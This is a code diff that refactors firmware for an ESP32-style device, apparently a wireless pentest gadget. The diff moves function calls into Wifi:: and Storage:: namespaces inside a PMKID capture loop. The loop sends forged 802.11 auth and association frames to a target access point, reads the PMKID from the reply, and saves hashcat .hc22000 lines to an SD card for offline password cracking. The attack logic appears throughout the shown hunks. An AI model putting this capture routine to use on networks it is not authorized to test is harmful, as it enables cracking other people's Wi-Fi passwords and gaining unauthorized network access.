@@ -153,8 +153,8 @@ void wifiPmkidLoop() {
 
 		// Pre-build frames (MACs are static, only seq changes)
 		_pmkSeqCtl = 0;
-		pmkBuildAuthFrame(pmkAuthFrame, pmkTargetBssid, pmkStaMac, _pmkSeqCtl);
-		pmkAssocFrameLen = pmkBuildAssocFrame(pmkAssocFrame,
+		Wifi::pmkBuildAuthFrame(pmkAuthFrame, pmkTargetBssid, pmkStaMac, _pmkSeqCtl);
+		pmkAssocFrameLen = Wifi::pmkBuildAssocFrame(pmkAssocFrame,
 			pmkTargetBssid, pmkStaMac, pmkTargetSsidRaw, pmkTargetSsidLen, _pmkSeqCtl + 1);
 
 		esp_wifi_set_promiscuous(true);
@@ -205,7 +205,7 @@ void wifiPmkidLoop() {
 		bool found = false;
 		uint8_t pmkid[16];
 		if (kdLen > 0 && bodyLen >= 95 + kdLen && (int)pkt.len >= bodyOff + 95 + kdLen) {
-			found = pmkScanIEs(pkt.data + bodyOff + 95, kdLen, pmkid);
+			found = Wifi::pmkScanIEs(pkt.data + bodyOff + 95, kdLen, pmkid);
 		}
 
 		if (found) {
@@ -213,7 +213,7 @@ void wifiPmkidLoop() {
 			pmkidTotalCaptured++;
 
 			// Lazy-open file on first successful capture
-			if (!fileOpen && sdBegin()) {
+			if (!fileOpen && Storage::mountSD()) {
 				String s = pmkTargetSsid;
 				s.replace(" ", "_");
 				s.replace("/", "_");
@@ -226,9 +226,9 @@ void wifiPmkidLoop() {
 				s.replace(">", "_");
 				s.replace("|", "_");
 
-				pmkidCapturePath = generateUniqueFilename("/pmkid_" + s, ".hc22000", false);
+				pmkidCapturePath = Storage::uniquePath("/pmkid_" + s, ".hc22000", false);
 
-				pmkidFile = SD.open(pmkidCapturePath, FILE_WRITE);
+				pmkidFile = Storage::open(pmkidCapturePath.c_str(), "w", false);
 				if (pmkidFile) {
 					fileOpen = true;
 					Serial.printf("PMKID: %s\n", pmkidCapturePath.c_str());
@@ -238,7 +238,7 @@ void wifiPmkidLoop() {
 			if (fileOpen && pmkidFile) {
 				uint8_t staMac[6];
 				esp_read_mac(staMac, ESP_MAC_WIFI_STA);
-				writePmkidHashLine(pmkidFile, pmkid, pmkTargetBssid, staMac,
+				Wifi::writePmkidHashLine(pmkidFile, pmkid, pmkTargetBssid, staMac,
 					pmkTargetSsidRaw, pmkTargetSsidLen);
 				pmkidFile.flush();
 			}
@@ -264,8 +264,8 @@ void wifiPmkidLoop() {
 						esp_wifi_set_channel(pmkTargetChannel, WIFI_SECOND_CHAN_NONE);
 			delay(30);
 			// Update sequence numbers in pre-built frames
-			pmkBuildAuthFrame(pmkAuthFrame, pmkTargetBssid, pmkStaMac, _pmkSeqCtl);
-			pmkSendRawFrame(pmkAuthFrame, 30);
+			Wifi::pmkBuildAuthFrame(pmkAuthFrame, pmkTargetBssid, pmkStaMac, _pmkSeqCtl);
+			Wifi::pmkSendRawFrame(pmkAuthFrame, 30);
 						pmkDisplayStep = 1;
 			pmkState = PMK_S_SEND_AUTH;
 			pmkStateTimer = now;
@@ -276,10 +276,10 @@ void wifiPmkidLoop() {
 		if (now - pmkStateTimer >= 150) {
 			// Wait for Auth response, then send Assoc Request
 			_pmkSeqCtl++;
-			pmkAssocFrameLen = pmkBuildAssocFrame(pmkAssocFrame,
+			pmkAssocFrameLen = Wifi::pmkBuildAssocFrame(pmkAssocFrame,
 				pmkTargetBssid, pmkStaMac, pmkTargetSsidRaw, pmkTargetSsidLen,
 				_pmkSeqCtl);
-			pmkSendRawFrame(pmkAssocFrame, pmkAssocFrameLen);
+			Wifi::pmkSendRawFrame(pmkAssocFrame, pmkAssocFrameLen);
 						pmkState = PMK_S_SEND_ASSOC;
 			pmkStateTimer = now;
 		}
